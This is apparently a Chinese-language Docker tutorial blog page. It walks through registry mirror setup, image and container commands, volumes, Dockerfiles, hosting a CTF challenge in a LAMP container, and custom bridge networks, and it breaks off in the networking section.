<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line"></span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://g68ie3s0.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br><span class="line">docker info</span><br><span class="line">docker 命令 --help   #万能命令</span><br></pre></td></tr></table></figure>

<p>帮助文档地址：<a target="_blank" rel="noopener" href="https://docs.docker.com/engine/reference/commandline/">https://docs.docker.com/engine/reference/commandline/</a></p>
<h3 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h3><p><strong>docker images</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">hello-world   latest    feb5d9fea6a5   9 months ago   13.3kB</span><br><span class="line"></span><br><span class="line">REPOSITORY  镜像的仓库源</span><br><span class="line">TAG         镜像的标签</span><br><span class="line">IMAGE ID    镜像的ID</span><br><span class="line">CREATED     镜像的创建时间</span><br><span class="line">SIZE        镜像的大小</span><br><span class="line"></span><br><span class="line">#可选项</span><br><span class="line">-a, --all             #列出所有镜像</span><br><span class="line">-q, --quiet           #只显示镜像的ID</span><br></pre></td></tr></table></figure>

<p><strong>docker search 搜索镜像</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-0-7-centos ~]# docker search mysql</span><br><span class="line">NAME                           DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                          MySQL is a widely used, open-source relation…   12829     [OK]       </span><br><span class="line">mariadb                        MariaDB Server is a high performing open sou…   4919      [OK] </span><br><span class="line"></span><br><span class="line">#可选项</span><br><span class="line">-f</span><br></pre></td></tr></table></figure>

<p><strong>docker pull 下载镜像</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#下载镜像 docker pull 镜像名[:tag]</span><br><span class="line">[root@VM-0-7-centos ~]# docker pull mysql:5.7               #如果不写tag，默认就是latest</span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">66fb34780033: Pull complete                                 #分层下载，docker image的核心 联合文件系统</span><br><span class="line">4b7eaab7220f: Pull complete </span><br><span class="line">8c8e39531477: Pull complete </span><br><span class="line">f03f15c3a663: Pull complete </span><br><span class="line">398ee43a4e22: Pull complete </span><br><span class="line">28754770caaf: Pull complete </span><br><span class="line">7ebec8d1922f: Pull complete </span><br><span class="line">62114f229774: Pull complete </span><br><span class="line">f8575f2324da: Pull complete </span><br><span class="line">b4c26cf54614: Pull complete </span><br><span class="line">Digest: sha256:4279d155f8cab19149c6078b20d53976f1498e31d6f848ac83e11323909b41f1   #签名</span><br><span class="line">Status: Downloaded newer image for mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7       #真实地址</span><br><span class="line"></span><br><span class="line">#等价</span><br><span class="line">docker pull mysql</span><br><span class="line">docker.io/library/mysql:5.7</span><br></pre></td></tr></table></figure>

<p><strong>docker rmi 删除镜像</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rmi -f 容器id                   #删除指定的镜像</span><br><span class="line">docker rmi -f 容器id 容器id 容器id      #删除多个镜像</span><br><span class="line">docker rmi -f $(docker images -aq)    #删除所有镜像</span><br></pre></td></tr></table></figure>

<h3 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h3><p>有了镜像才可以创建容器，这里以centos为例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull centos</span><br></pre></td></tr></table></figure>

<p><strong>新建容器并启动</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">docker run [可选参数] image</span><br><span class="line"></span><br><span class="line">#参数说明</span><br><span class="line">--name=&quot;Name&quot;     #容器名字</span><br><span class="line">-d                #后台方式运行</span><br><span class="line">-it               #使用交互方式运行，进入容器查看内容</span><br><span class="line">-p                #指定容器的端口</span><br><span class="line">	-p ip:主机端口:容器端口</span><br><span class="line">	-p 主机端口:容器端口（常用）</span><br><span class="line">	-p 容器端口</span><br><span class="line">	容器端口</span><br><span class="line">-P                #随机指定端口</span><br><span class="line"></span><br><span class="line">#测试，启动并进入容器</span><br><span class="line">[root@VM-0-7-centos ~]# docker run -it centos /bin/bash</span><br><span class="line">[root@d9b4f12abc7b /]# ls</span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line"></span><br><span class="line">#从容器中退回主机</span><br><span class="line">[root@d9b4f12abc7b /]# exit</span><br><span class="line">exit</span><br><span class="line">[root@VM-0-7-centos /]# ls</span><br><span class="line">bin  boot  data  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  patch  proc  root  run  sbin  srv  sys  tmp  usr  var  www</span><br></pre></td></tr></table></figure>

<p><strong>列出所有的运行容器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker ps         #列出当前正在运行的容器</span><br><span class="line"></span><br><span class="line">#参数说明</span><br><span class="line">-a                #列出当前正在运行的容器，带出历史运行过的容器</span><br><span class="line">-n=?              #显示最近创建的容器</span><br><span class="line">-q                #只显示容器的编号</span><br></pre></td></tr></table></figure>

<p><strong>退出容器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit        #直接停止并退出</span><br><span class="line">Ctrl+P+Q    #不停止退出</span><br></pre></td></tr></table></figure>

<p><strong>删除容器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rm 容器id                 #删除指定容器，不能删除正在运行的容器</span><br><span class="line">docker rm -f $(docker ps -aq)   #删除所有容器</span><br><span class="line">docker ps -a -q|xargs docker rm #删除所有容器</span><br></pre></td></tr></table></figure>

<p><strong>启动和停止</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器id        #启动容器</span><br><span class="line">docker restart 容器id      #重启容器</span><br><span class="line">docker stop 容器id         #停止当前正在运行的容器</span><br><span class="line">docker kill 容器id         #强制停止当前容器</span><br></pre></td></tr></table></figure>

<h3 id="常用其他命令"><a href="#常用其他命令" class="headerlink" title="常用其他命令"></a>常用其他命令</h3><p><strong>后台启动容器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d 镜像名</span><br></pre></td></tr></table></figure>

<p><strong>产看日志</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -tf --tail 条数 容器id</span><br></pre></td></tr></table></figure>

<p><strong>查看容器中进程信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker top 容器id</span><br></pre></td></tr></table></figure>

<p><strong>查看镜像的元数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 容器id</span><br></pre></td></tr></table></figure>

<p><strong>进入当前正在运行的容器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 容器id bashShell</span><br><span class="line"></span><br><span class="line">[root@VM-0-7-centos ~]# docker exec -it 73f640b24eab /bin/bash</span><br><span class="line">[root@73f640b24eab /]# ls</span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker attach 容器id</span><br><span class="line"></span><br><span class="line">#docker exec     #进入容器后开启一个新的终端，可以在里面操作（常用）</span><br><span class="line">#docker attach   #进入容器正在执行的终端，不会启动新的进程</span><br></pre></td></tr></table></figure>

<p><strong>从容器内拷贝文件到主机上</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 容器id:容器内路径 目的主机路径</span><br></pre></td></tr></table></figure>

<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>Docker安装Nginx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.搜索镜像 docker search 建议看帮助文档</span><br><span class="line"># 2.下载镜像</span><br><span class="line">docker pull nginx</span><br><span class="line"># 3.运行测试</span><br><span class="line">docker images</span><br><span class="line">docker run -d --name nginx01 -p 3344:80 nginx   # -d后台运行 -p宿主机端口:容器内部端口</span><br><span class="line">curl localhost:3344</span><br><span class="line"></span><br><span class="line"># 进入容器</span><br><span class="line">docker exec -it nginx01 /bin/bash</span><br><span class="line"># 删除容器</span><br><span class="line">docker stop nginx01</span><br></pre></td></tr></table></figure>

<p>部署tomcat</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker pull tomcat</span><br><span class="line">docker run -d -p 3344:8080 --name tomcat01 tomcat</span><br><span class="line"></span><br><span class="line"># 进入容器</span><br><span class="line">docker exec -it tomcat01 /bin/bash</span><br><span class="line">cp -r webapps.dist/* webapps</span><br></pre></td></tr></table></figure>

<p>部署es+kibana</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name elasticsearch --net somenetwork -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; elasticsearch:tag</span><br></pre></td></tr></table></figure>

<h2 id="可视化（存在问题）"><a href="#可视化（存在问题）" class="headerlink" title="可视化（存在问题）"></a>可视化（存在问题）</h2><p>portainer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker pull portainer/portainer</span><br><span class="line"></span><br><span class="line">docker run -d \</span><br><span class="line">-p 9000:9000 \</span><br><span class="line">--name prtainer-test \</span><br><span class="line">--restart=always \</span><br><span class="line">-v /opt/portainer:/data \</span><br><span class="line">-v /var/run/docker.sock:/var/run/docker.sock \</span><br><span class="line">portainer/portainer</span><br></pre></td></tr></table></figure>

<h2 id="commit镜像"><a href="#commit镜像" class="headerlink" title="commit镜像"></a>commit镜像</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker commit 提交容器成为一个新的副本</span><br><span class="line"></span><br><span class="line">#命令和git原理类似</span><br><span class="line">docker commit -m=&quot;提交的描述信息&quot; -a=&quot;作者&quot; 容器id 目标镜像名:[tag]</span><br></pre></td></tr></table></figure>

<h2 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h2><p>容器的持久化和同步操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v 主机目录:容器内目录</span><br><span class="line"></span><br><span class="line">#测试</span><br><span class="line">docker run -it -v /home/ceshi:/home centos /bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h3><p>安装mysql</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:5.7</span><br><span class="line"></span><br><span class="line">#官方：docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag</span><br><span class="line"></span><br><span class="line">docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span><br></pre></td></tr></table></figure>

<h3 id="具名和匿名挂载"><a href="#具名和匿名挂载" class="headerlink" title="具名和匿名挂载"></a>具名和匿名挂载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#匿名挂载</span><br><span class="line">docker run -d -P --name nginx01 -v /etc/nginx nginx</span><br><span class="line">#查看所有的 volume 的情况</span><br><span class="line">docker volume ls</span><br><span class="line"></span><br><span class="line">#具名挂载</span><br><span class="line">docker run -d -P --name nginx01 -v juming-nginx:/etc/nginx nginx</span><br><span class="line">#通过 -v 卷名:容器内路径</span><br></pre></td></tr></table></figure>

<p>拓展：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ro   readonly    #只读</span><br><span class="line">rw   readwrite   #读写</span><br><span class="line"></span><br><span class="line">docker run -d -P --name nginx01 -v juming-nginx:/etc/nginx:ro nginx</span><br><span class="line">docker run -d -P --name nginx01 -v juming-nginx:/etc/nginx:rw nginx</span><br></pre></td></tr></table></figure>

<p>多个mysql实现数据共享</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 3310:3306 -v /etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span><br><span class="line"></span><br><span class="line">docker run -d -p 3310:3306 -e MYSQL_ROOT_PASSWORD=123456 --name mysql02	 --volumes-from mysql01 mysql:5.7</span><br></pre></td></tr></table></figure>

<h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个Dockerfile文件</span><br><span class="line"># 文件中的内容</span><br><span class="line"></span><br><span class="line">FROM centos</span><br><span class="line"></span><br><span class="line">VOLUME [&quot;volume01&quot;,&quot;volume02&quot;]</span><br><span class="line"></span><br><span class="line">CMD echo &quot;-----end-----&quot;</span><br><span class="line"></span><br><span class="line">CMD /bin/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker build -f /test/Dockerfile -t yb/centos:1.0 .</span><br><span class="line"></span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line">docker run -it 容器id /bin/bash</span><br></pre></td></tr></table></figure>

<p>构建步骤：</p>
<p>1.编写一个 dockerfile 文件</p>
<p>2.docker build 构建成为一个镜像</p>
<p>3.docker run 运行镜像</p>
<p>4.docker push 发布镜像（DockerHub，阿里云镜像仓库）</p>
<h3 id="DockerFile的指令"><a href="#DockerFile的指令" class="headerlink" title="DockerFile的指令"></a>DockerFile的指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM                # 基础镜像，一切从这里开始</span><br><span class="line">MAINTAINER          # 镜像是谁写的，姓名+邮箱</span><br><span class="line">RUN                 # 镜像构建的时候需要运行的命令</span><br><span class="line">ADD                 # 将本地文件添加到容器中，tar类型文件会自动解压(网络压缩资源不会被解压)，可以访问网络资源，类似wget</span><br><span class="line">WORKDIR             # 镜像的工作目录</span><br><span class="line">VOLUME              # 挂载的目录</span><br><span class="line">EXPOSE              # 保留端口配置</span><br><span class="line">CMD                 # 指定这个容器启动的时候要运行的命令（只有最后一个会生效）</span><br><span class="line">EMTRYPOINT          # 指定这个容器启动的时候要运行的命令，可以追加命令</span><br><span class="line">ONBUILD             # 当构建一个被继承DockerFile，这个时候就会运行ONBUILD的指令，触发指令</span><br><span class="line">COPY                # 功能类似ADD，但是是不会自动解压文件，也不能访问网络资源</span><br><span class="line">ENV                 # 构建的时候设置环境变量</span><br></pre></td></tr></table></figure>

<ul>
<li>CMD ：指定容器启动的时候要运行的命令，只有最后一个会生效</li>
<li>ENTRYPOINT ：指定容器启动的时候要运行的命令,命令可以追加</li>
</ul>
<p>通过编写Dockerfile文件来制作Centos镜像，并在官方镜像的基础上添加vim和net-tools工具。首先在&#x2F;home&#x2F;dockfile 目录下新建文件mydockerfile-centos。然后使用上述指令编写该文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@iZwz99sm8v95sckz8bd2c4Z dockerfile]# cat mydockerfile-centos</span><br><span class="line">FROM centos:7</span><br><span class="line">MAINTAINER Yb&lt;2365043546@qq.com&gt;</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local                      # 设置环境变量MYPATH</span><br><span class="line">WORKDIR $MYPATH                            # 直接使用上面设置的环境变量，指定/usr/local为工作目录</span><br><span class="line"></span><br><span class="line">RUN yum -y install vim</span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80                                  # 将容器80端口暴露出来，允许外部连接这个端口</span><br><span class="line"></span><br><span class="line">CMD echo $MYPATH</span><br><span class="line">CMD echo &quot;---end---&quot;</span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure>

<p>构建镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#docker build -f dockerfile文件路径 -t 镜像名[:版本号] .</span><br><span class="line">docker build -f mydocker -t mycentos:1.0 .</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -it mycentos:1.0</span><br><span class="line">pwd</span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<p>通过<code>docker history 容器id</code>命令来查看镜像的构建步骤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker history mycentos:1.0</span><br></pre></td></tr></table></figure>

<h2 id="用Docker搭建环境部署ctf题目"><a href="#用Docker搭建环境部署ctf题目" class="headerlink" title="用Docker搭建环境部署ctf题目"></a>用Docker搭建环境部署ctf题目</h2><p>首先找一个有lamp环境的docker镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search lamp</span><br></pre></td></tr></table></figure>

<p>拉取镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull tutum/lamp</span><br></pre></td></tr></table></figure>

<p>新建docker容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 3344:80 -p 9999:3306 tutum/lamp</span><br></pre></td></tr></table></figure>

<p>查看系统中运行的docker容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p>使用浏览器访问，查看是否成功映射</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip:3344</span><br></pre></td></tr></table></figure>

<p>环境已经搭建完毕，可以将ctf题目源码拷贝到container的主目录中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 题目文件 容器id:var/www/html</span><br></pre></td></tr></table></figure>

<p>安装vim</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install vim</span><br></pre></td></tr></table></figure>

<p>Dockerfile</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FROM tutum/lamp</span><br><span class="line">COPY web/index.php /var/www/html</span><br><span class="line">COPY web/login.php /var/www/html</span><br><span class="line">COPY web/flag.txt /</span><br><span class="line">EXPOSE 80</span><br><span class="line">docker build -t yb/test:1.0 .</span><br><span class="line">docker run -d -p 3344:80 yb/test:1.0</span><br></pre></td></tr></table></figure>

<h2 id="Docker网络"><a href="#Docker网络" class="headerlink" title="Docker网络"></a>Docker网络</h2><p>查看所有的Docker网络：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network ls</span><br></pre></td></tr></table></figure>

<p>Docker默认提供了四个网络模式，说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bridge：容器默认的网络是桥接模式(自己搭建的网络默认也是使用桥接模式,启动容器默认也是使用桥接模式)。此模式会为每一个容器分配、设置IP等，并将容器连接到一个docker0虚拟网桥，通过docker0网桥以及Iptables nat表配置与宿主机通信。</span><br><span class="line"></span><br><span class="line">none：不配置网络，容器有独立的Network namespace，但并没有对其进行任何网络设置，如分配veth pair 和网桥连接，配置IP等。</span><br><span class="line"></span><br><span class="line">host：容器和宿主机共享Network namespace。容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。</span><br><span class="line"></span><br><span class="line">container：创建的容器不会创建自己的网卡，配置自己的IP容器网络连通。容器和另外一个容器共享Network namespace（共享IP、端口范围）。</span><br></pre></td></tr></table></figure>

<p>容器默认使用bridge网络模式，我们使用该docker run –network&#x3D;选项指定容器使用的网络：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">host模式：使用 --net=host 指定。</span><br><span class="line">none模式：使用 --net=none 指定。</span><br><span class="line">bridge模式：使用 --net=bridge 指定，默认设置。</span><br><span class="line">container模式：使用 --net=container:NAME_or_ID 指定。</span><br></pre></td></tr></table></figure>

<p>当启动一个容器时，可以看到容器内部和Linux主机都会创建一个新的网卡，而这两个网卡都是成对的。使用的技术就是evth-pair。evth-pair 就是一对的虚拟设备接口，他们是成对出现的，一段连着协议，一段彼此相连。evth-pair充当一个桥梁，连接各种虚拟网络设备。</p>
<p>Linux主机可以直接网络连接Docker容器。Docker容器和容器之间同样可以直接网络连接的。</p>
<h3 id="自定义网络"><a href="#自定义网络" class="headerlink" title="自定义网络"></a>自定义网络</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network --help</span><br></pre></td></tr></table></figure>

<p>自定义一个网络</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet</span><br><span class="line">--driver bridge          #指定bridge驱动程序来管理网络</span><br><span class="line">--subnet 192.168.0.0/16  #指定网段的CIDR格式的子网</span><br><span class="line">--gateway 192.168.0.1 	 #指定主子网的IPv4或IPv6网关</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021447165.png"></p>
<p>网络mynet创建成功后，查看网络信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network inspect mynet</span><br></pre></td></tr></table></figure>

<p>下面启动两个容器，指定使用该自定义网络mynet，测试处于自定义网络下的容器，是否可以直接通过容器名进行网络访问。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P --name tomcat-net-01 --net mynet tomcat </span><br><span class="line">docker run -d -P --name tomcat-net-02 --net mynet tomcat </span><br><span class="line">docker network inspect mynet</span><br></pre></td></tr></table></figure>

<p>在我们的自定义网络下，容器之间既可以通过容器名也可以通过ip地址进行网络通信。 我们自定义的网络默认已经帮我们维护了容器间的网络通信问题，这是实现网络互联的推荐方式。</p>
<h3 id="网络之间的互联"><a href="#网络之间的互联" class="headerlink" title="网络之间的互联"></a>网络之间的互联</h3><p>没有设置的情况下，不同网络间的容器是无法进行网络连接的。如图，两个不同的网络docker0和自定义网络mynet的网络模型图：</p>
